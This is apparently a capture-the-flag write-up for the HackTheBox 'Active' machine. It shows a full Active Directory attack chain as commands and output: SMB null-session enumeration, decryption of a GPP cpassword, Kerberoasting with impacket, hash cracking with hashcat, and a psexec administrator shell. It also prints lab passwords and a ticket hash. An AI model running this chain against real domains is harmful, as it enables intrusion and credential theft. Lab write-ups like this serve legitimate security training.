---
layout: post
title: HTB Active Writeup
date: 2026-03-28 21:45 -0400
categories: [Writeups, HackTheBox]
tags: [ctf]
---

## Initial Enumeration
Let's start with our standard nmap scan
``` shell
sudo nmap -sC -sV -vv --top-ports=5000 $TARGETIP -oN nmapout
```

**Open Ports**
``` shell
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-18 20:04:04Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49164/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49173/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49175/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

The target appears to be Domain Controller based on the ports open.
``` shell
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

We can also add the FQDN to our `/etc/hosts`:
``` shell
echo "$TARGETIP    DC.active.htb active.htb" | sudo tee -a /etc/hosts
```

## Service Enumeration

### SMB
We are able to enumerate the shares with null authentication:
``` shell
nxc smb $TARGETIP -u '' -p '' --shares
```

We see that the Replication share is able to be read
``` shell
nxc smb $TARGETIP -u '' -p '' --shares
SMB         10.129.11.79    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.11.79    445    DC               [+] active.htb\: 
SMB         10.129.11.79    445    DC               [*] Enumerated shares
SMB         10.129.11.79    445    DC               Share           Permissions     Remark
SMB         10.129.11.79    445    DC               -----           -----------     ------
SMB         10.129.11.79    445    DC               ADMIN$                          Remote Admin
SMB         10.129.11.79    445    DC               C$                              Default share
SMB         10.129.11.79    445    DC               IPC$                            Remote IPC
SMB         10.129.11.79    445    DC               NETLOGON                        Logon server share 
SMB         10.129.11.79    445    DC               Replication     READ            
SMB         10.129.11.79    445    DC               SYSVOL                          Logon server share 
SMB         10.129.11.79    445    DC               Users
```

We will use the spider_plus module to download the share information:
``` shell
nxc smb $TARGETIP -u '' -p '' --shares -M spider_plus -o DOWNLOAD=True MAX_FILE_SIZE=10000000 OUTPUT_FOLDER=$(pwd)
```

Within the downloaded share, in the `Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups` directory there exists a Groups.xml:
``` xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

The **cpassword** value can be decrypted with impacket-Get-GPPPassword:
``` shell
impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Found a Groups XML file:
[*]   file      : Groups.xml
[*]   newName   : 
[*]   userName  : active.htb\SVC_TGS
[*]   password  : GPPstillStandingStrong2k18
[*]   changed   : 2018-07-18 20:46:06
```

## User Access
With these credentials as a TGS service, let's focus on Kerberos.

``` shell
sudo impacket-GetUserSPNs -dc-ip $TARGETIP -request active.htb/svc_tgs 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-03-18 16:03:03.531788             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$245d5eca2c92c5910f0ac97cf0d5ccdf$d34f9345567c37a1149898a2637c6919f6169a9b60ff24e4342a7313cc8c159e741d2998b57ad8f764731ed504995b3b4c14676345e29b2e4caaa0f3bcb26ef366760df1178ff37df0d8fdc4d023206173320ad40cb5571227d2c13e973c6ac75f306b5d90cec3d5d5e61b4b2c2b00e4f017bd3d528f07f0f7ec0ef516580bdd81aa01bbe3b8a5d189b43193965bf014b9175f78c2c0d98c33e677357b9006c5a0fcf559ba9e3a12552ad0e57670d56b5809056c137c15f0cc30ea6bf86fab6bc722ec76a651cd4f867d70e69f2cf90714e58f3fee2256563cf3b2e665b2837fd34d8ad969af14e536d42a36904730c7d0cd1142c44e40a7457c72ee26a51968584735ca8dce8ebc0325966c45f9e28865c22076481114f1258a9f313bdeec03e7c8ade39f9652a68ad556e60fe385c70a26461db7b9daeb806a32f39acf65839b2827d89896bcfbeb69c1d9344d00d96a86297108cad9a350ba0fc6b20913add1a1ea375f5af8775be7c4e7766ee0cea20c67bf98a10a57852f9cb96e82ead296606bfaf08601c22a4ec2dff47a624cd8e964236e03e163847c6efa438e0a7be25eee81234cb23212aa611a14746f2ba73882588ecfbfbdec1735564bf6d9d46fdf5133eb09c28f5e10ca5a008b8c788b99692b141325eef97f7bb8e9c431c8f8c70637f185dfc8f56c0b4d77b8a7262e57a355c0015fe4c9fc3c254a5430487fef2f86d6d7956f3b9356c3c13a5ef187f5f1cd05dcb99f344dba843e3066a1d3cb97b1423206e1f60b4511fc6d321f8e61a5f97a4a8cfc22da915d339cccdff8a8a19232dc2da31d73f50ae4ca63af29b32a1380876bceeb8ab2c5d409bddc8949f481459f43dfeafa02aacbdf08ad8fbadf8d0d9c886ce272f8618f2e8b7367ddee5480fefa9137ce96185300182f912088875c4c619f12a8c47af47f937ffac80b6b3e134eec4c4df78c846bb7525c294106419a68bd8d709d864590010a85d96bc4da726d7bec637baed2ab61d4a417e1a0567beeca1fb68d6f67eb03a6b8d5b1d8995b136955b60d834943a34c38ee321f5bef91206c3e208dc33df0936f2f484e28aa468e734ff1c3975295601ab0e9479134e59a32603dcf6eabf00775309791606ecd88aa8ff58293be0c0548144b2e7b0746f4dbd40e0d9176c47a79c306cf2bd761380a4c926cf845104a4c641d0997a98a78dbd916d6b7878091ac025c6c4ebcb97bccbb2d18793701432427986b15aaef76436b
```

We can crack this hash with hashcat:
``` shell
hashcat '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$245d5eca2c92c5910f0ac97cf0d5ccdf$d34f9345567c37a1149898a2637c6919f6169a9b60ff24e4342a7313cc8c159e741d2998b57ad8f764731ed504995b3b4c14676345e29b2e4caaa0f3bcb26ef366760df1178ff37df0d8fdc4d023206173320ad40cb5571227d2c13e973c6ac75f306b5d90cec3d5d5e61b4b2c2b00e4f017bd3d528f07f0f7ec0ef516580bdd81aa01bbe3b8a5d189b43193965bf014b9175f78c2c0d98c33e677357b9006c5a0fcf559ba9e3a12552ad0e57670d56b5809056c137c15f0cc30ea6bf86fab6bc722ec76a651cd4f867d70e69f2cf90714e58f3fee2256563cf3b2e665b2837fd34d8ad969af14e536d42a36904730c7d0cd1142c44e40a7457c72ee26a51968584735ca8dce8ebc0325966c45f9e28865c22076481114f1258a9f313bdeec03e7c8ade39f9652a68ad556e60fe385c70a26461db7b9daeb806a32f39acf65839b2827d89896bcfbeb69c1d9344d00d96a86297108cad9a350ba0fc6b20913add1a1ea375f5af8775be7c4e7766ee0cea20c67bf98a10a57852f9cb96e82ead296606bfaf08601c22a4ec2dff47a624cd8e964236e03e163847c6efa438e0a7be25eee81234cb23212aa611a14746f2ba73882588ecfbfbdec1735564bf6d9d46fdf5133eb09c28f5e10ca5a008b8c788b99692b141325eef97f7bb8e9c431c8f8c70637f185dfc8f56c0b4d77b8a7262e57a355c0015fe4c9fc3c254a5430487fef2f86d6d7956f3b9356c3c13a5ef187f5f1cd05dcb99f344dba843e3066a1d3cb97b1423206e1f60b4511fc6d321f8e61a5f97a4a8cfc22da915d339cccdff8a8a19232dc2da31d73f50ae4ca63af29b32a1380876bceeb8ab2c5d409bddc8949f481459f43dfeafa02aacbdf08ad8fbadf8d0d9c886ce272f8618f2e8b7367ddee5480fefa9137ce96185300182f912088875c4c619f12a8c47af47f937ffac80b6b3e134eec4c4df78c846bb7525c294106419a68bd8d709d864590010a85d96bc4da726d7bec637baed2ab61d4a417e1a0567beeca1fb68d6f67eb03a6b8d5b1d8995b136955b60d834943a34c38ee321f5bef91206c3e208dc33df0936f2f484e28aa468e734ff1c3975295601ab0e9479134e59a32603dcf6eabf00775309791606ecd88aa8ff58293be0c0548144b2e7b0746f4dbd40e0d9176c47a79c306cf2bd761380a4c926cf845104a4c641d0997a98a78dbd916d6b7878091ac025c6c4ebcb97bccbb2d18793701432427986b15aaef76436b' /usr/share/wordlists/rockyou.txt
```

We find the password 'Ticketmaster1968'
``` shell
Administrator / Ticketmaster1968
```

Let's see if we can get a session with impacket-psexec:
``` shell
impacket-psexec Administrator:Ticketmaster1968@$TARGETIP

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.11.79.....
[*] Found writable share ADMIN$
[*] Uploading file uLPexQsi.exe
[*] Opening SVCManager on 10.129.11.79.....
[*] Creating service KkiI on 10.129.11.79.....
[*] Starting service KkiI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

We are able to get our **root.txt** from the administrator's desktop:
``` shell
Directory of C:\Users\Administrator\Desktop

21/01/2021  07:49 ��    <DIR>          .
21/01/2021  07:49 ��    <DIR>          ..
31/03/2026  07:40 ��                34 root.txt

               1 File(s)             34 bytes
               2 Dir(s)   1.164.517.376 bytes free

```

We can circle back to get the **user.txt** flag from the svc_tgs user folder:
``` shell
C:\Users\SVC_TGS\Desktop> dir
Volume in drive C has no label.
Volume Serial Number is 15BB-D59C

 Directory of C:\Users\SVC_TGS\Desktop

21/07/2018  06:14 ��    <DIR>          .
21/07/2018  06:14 ��    <DIR>          ..
31/03/2026  07:40 ��                34 user.txt

               1 File(s)             34 bytes
               2 Dir(s)   1.164.517.376 bytes free
```